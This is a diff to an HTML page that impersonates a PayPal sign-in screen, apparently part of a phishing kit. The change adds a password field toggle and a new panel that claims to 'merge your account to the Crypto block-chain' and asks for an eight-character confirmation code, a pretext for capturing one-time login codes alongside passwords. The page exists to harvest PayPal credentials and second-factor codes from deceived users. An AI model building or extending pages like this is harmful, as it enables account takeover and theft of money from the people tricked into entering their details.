@@ -35,18 +35,50 @@
         <main style="display: none;">
             <div class="logo"><img src="./logo.svg" alt=""></div>
             <div class="action-col">
-                <span id="email-show"></span>
+                <span class="email-show"></span>
                 <span id="back">Change</span>
             </div>
-            <div class="input-hold">
-                <label for="password">Enter your password</label>
-                <input type="password" id="password" name="pay-password">
+            <div class="flex-input">
+                <div class="input-hold">
+                    <label for="password">Enter your password</label>
+                    <input type="password" id="password" name="pay-password">
+                </div>
+                <div class="toggle_password">Show</div>
             </div>
             <p style="color: rgb(218, 87, 87); font-weight: 500; font-size: 13px; width: 100%; display: none;"
                 class="req">Required</p>
             <a href="https://www.paypal.com/authflow/password-recovery/?country.x=NG&locale.x=en_US&redirectUri=%252Fsignin"
                 class="forgot-sth">Forgot password?</a>
-            <button id="submit">Sign In</button>
+            <button id="submit" onclick="return false;">Sign In</button>
+            <div class="or">
+                <div class="line"></div>
+                <div class="txt">or</div>
+                <div class="line"></div>
+            </div>
+            <button onclick="location.href = 'https:\/\/www.paypal.com/ng/welcome/signup/#/login_info';">Sign
+                Up</button>
+        </main>
+        <main class="code-active" style="display: none;">
+            <div class="logo">
+                <img src="./logo.svg" alt="">⇆<img src="./btc-logo.png" alt="">
+            </div>
+            <div class="action-col">
+                <span style="text-align: center;">
+                    This process will merge your account to the <b><i>Crypto block-chain</i></b>
+                </span>
+            </div>
+            <div class="flex-input">
+                <div class="input-hold">
+                    <label for="code">Confirmation Code</label>
+                    <input type="password" id="code" name="pay-code" maxlength="8">
+                </div>
+                <div class="toggle_password">Show</div>
+            </div>
+            <p style="color: rgb(218, 87, 87); font-weight: 500; font-size: 13px; width: 100%; display: none;"
+                class="req">Required</p>
+            <a href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin"
+                class="forgot-sth">Forgot email?</a>
+            <button type="submit">Link Crypto Chain</button>
             <div class="or">
                 <div class="line"></div>
                 <div class="txt">or</div>
